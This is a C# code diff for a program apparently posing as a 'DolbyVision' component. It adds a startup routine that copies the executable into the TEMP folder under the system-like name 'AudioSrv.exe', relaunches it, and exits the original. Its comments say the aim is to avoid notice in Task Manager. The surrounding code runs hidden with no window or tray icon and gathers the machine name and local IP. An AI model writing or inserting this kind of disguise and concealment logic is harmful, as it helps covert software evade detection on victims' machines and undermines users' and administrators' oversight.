@@ -27,6 +27,20 @@ namespace DolbyVision
         [STAThread]
         static void Main()
         {
+            // 自复制到TEMP并改名为系统进程名，原文件可删除，任务管理器不易暴露
+            string currentPath = Application.ExecutablePath;
+            string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
+            if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
+            {
+                try
+                {
+                    File.Copy(currentPath, tempPath, true);
+                    System.Diagnostics.Process.Start(tempPath);
+                    return; // 原实例退出，释放文件锁
+                }
+                catch { }
+            }
+
             // 完全后台运行，无窗口无托盘
             _machineName = Environment.MachineName;
             _localIp = GetLocalIP();
